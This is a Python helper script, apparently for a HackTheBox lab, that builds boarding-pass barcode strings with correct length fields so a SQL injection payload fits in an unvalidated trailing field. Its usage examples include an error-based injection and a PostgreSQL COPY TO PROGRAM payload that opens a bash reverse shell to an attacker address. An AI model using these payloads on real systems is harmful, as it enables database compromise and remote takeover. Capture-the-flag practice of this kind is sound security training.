#!/usr/bin/env python3
"""
bcbp_builder.py

Small helper to build BCBP (Bar Coded Boarding Pass) "raw" strings with a
correctly-computed conditional-section hex length, used against the
DutyBound (HackTheBox) boarding-pass verification endpoint.

BCBP layout used here (one leg, mandatory fields + conditional section):

    <fixed mandatory fields>
    <item10: 2-char hex length of everything that follows>
    >6
    <item17 len (2 chars)>
    <unique conditional data>
    <free-form "airline individual use" tail>   <-- injection point

The endpoint validates the mandatory fields and the item10/item17 lengths
strictly, but does NOT validate or sanitize the trailing "airline individual
use" field before using it to build a SQL query -- that's the vulnerability.

This script does not exploit anything by itself; it just computes correct
lengths and prints a ready-to-send `raw` value (and the matching JSON body)
so you can paste it into Burp Repeater, curl, or your own script.

Usage:
    python3 bcbp_builder.py --tail "'"
    python3 bcbp_builder.py --tail "' || (SELECT CAST(current_user AS int)) || '"
    python3 bcbp_builder.py --tail "'); COPY (SELECT 1) TO PROGRAM 'bash -c \"bash -i >&
        /dev/tcp/10.10.14.1/4444 0>&1\"'; -- "
"""

import argparse
import json

# Fixed mandatory BCBP fields (passenger name, record locator, routing,
# carrier/flight, class, seat, sequence, item10 placeholder is appended
# after we compute it). Adjust if you need a different passenger/route.
FIXED_PREFIX = "M1DOE/JOHN            EABCDEF LHRJFKHTB1234 032Y012A0001A1"

# The conditional section's "item17 length" field, as a 2-char hex string.
# 0x18 == 24, matching the 24-char unique_section below.
ITEM17_LEN_HEX = "18"

# 24 bytes of "unique" conditional-section data that the parser expects for
# a single, otherwise-valid leg. This was recovered by iteratively matching
# the application's BCBP_ERR_ITEM10_MISMATCH / BCBP_ERR_ITEM17_MISMATCH
# error messages -- see the write-up for the derivation.
UNIQUE_SECTION = "0WW6252BHTB000000000000"


def build_raw(tail: str, fixed_prefix: str = FIXED_PREFIX,
              item17_len_hex: str = ITEM17_LEN_HEX,
              unique_section: str = UNIQUE_SECTION) -> str:
    """
    Build a full BCBP `raw` string with `tail` appended after the unique
    conditional section, and the item10 hex length recomputed to match.
    """
    after_len_field = item17_len_hex + unique_section + tail
    total_len = len(after_len_field)
    if total_len > 0xFF:
        raise ValueError(
            f"Conditional section too long ({total_len} bytes); "
            "item10 is a single hex byte (max 255)."
        )
    item10_hex = format(total_len, "02X")
    return fixed_prefix + item10_hex + ">6" + after_len_field


def main():
    parser = argparse.ArgumentParser(description=__doc__,
                                      formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument(
        "--tail", required=True,
        help="Content to append after the unique conditional section "
             "(this is the unvalidated 'airline individual use' field -- "
             "your injection payload goes here)."
    )
    parser.add_argument(
        "--prefix", default=FIXED_PREFIX,
        help="Override the fixed mandatory BCBP prefix if needed."
    )
    args = parser.parse_args()

    raw = build_raw(args.tail, fixed_prefix=args.prefix)

    print("raw string:")
    print(raw)
    print()
    print("JSON body for the verify endpoint:")
    print(json.dumps({"raw": raw}))


if __name__ == "__main__":
    main()

